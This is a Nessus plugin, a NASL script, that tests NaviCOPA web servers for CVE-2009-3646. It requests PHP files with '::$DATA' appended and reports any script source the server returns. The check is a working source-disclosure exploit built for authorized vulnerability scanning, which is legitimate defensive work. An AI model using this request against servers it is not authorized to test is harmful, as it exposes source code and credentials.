#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(41646);
  script_version("$Revision: 1.12 $");
script_cvs_date("$Date: 2015/09/24 21:17:13 $");

  script_cve_id("CVE-2009-3646");
  script_osvdb_id(58386);
  script_xref(name:"EDB-ID", value:"9694");

  script_name(english:"NaviCOPA ::$DATA Extension Request Source Code Disclosure");
  script_summary(english:"Tries to read the source of a PHP script");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure
vulnerability."  );
  script_set_attribute(attribute:"description",  value:
"The installed version of the NaviCOPA web server software on the
remote host returns the source of scripts hosted on it when '::$DATA'
is appended to the request URL.  A remote attacker can leverage this
issue to view the source code of CGIs and possibly obtain passwords
and other sensitive information from this host."  );
  script_set_attribute( attribute:"solution",  value:
"Upgrade to NaviCOPA 3.01.2 from 17th September 2009 or later as that
reportedly addresses the issue."  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(200);
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/09/16"
  );
  script_set_attribute(
    attribute:"patch_publication_date", 
    value:"2009/09/17"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/09/28"
  );
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");
  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "Web server does not support PHP scripts.");
 

# NB: we need this when testing NaviCOPA. :-)
disable_cookiejar();


# Unless we're paranoid, make sure the banner looks like NaviCOPA.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "Server: InterVations NaviCOPA" >!< banner) exit(0);
}


# NB: check a couple of files in case some don't contain any PHP code
#     or include it in the generated output.
max_files = 5;
files = get_kb_list(string("www/", port, "/content/extensions/php"));
if (isnull(files)) files = make_list("/index.php");

n = 0;
foreach file (files)
{
  ++n;

  # Try to exploit the issue.
  url = string(file, "::$DATA");
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res) || isnull(res[2])) exit(1, "The web server failed to respond.");

  # nb: we need to remove CRs to be able to anchor regex to end of line.
  res[2] = str_replace(find:'\r\n', replace:'\n', string:res[2]);

  # If it looks like PHP source...
  if (
    "Content-Type: text/plain" >< res[1] &&
    "?>" >< res[2] &&
    egrep(pattern:"<\?(php|=)( |$)", string:res[2])
  )
  {
    res2 = http_send_recv3(method:"GET", item:file, port:port);
    if (isnull(res2)) exit(1, "The web server failed to respond.");

    if (!egrep(pattern:"<\?(php|=)( |$)", string:res2[2]))
    {
      if (report_verbosity > 0)
      {
        report = string(
          "\n",
          "Nessus was able to retrieve the source of '", file, "' using\n",
          "the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );

        if (report_verbosity > 1)
        {
          report = string(
            report,
            "\n",
            "Here it is :\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            res[2], "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }

        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }

  if (n > max_files) break;
}
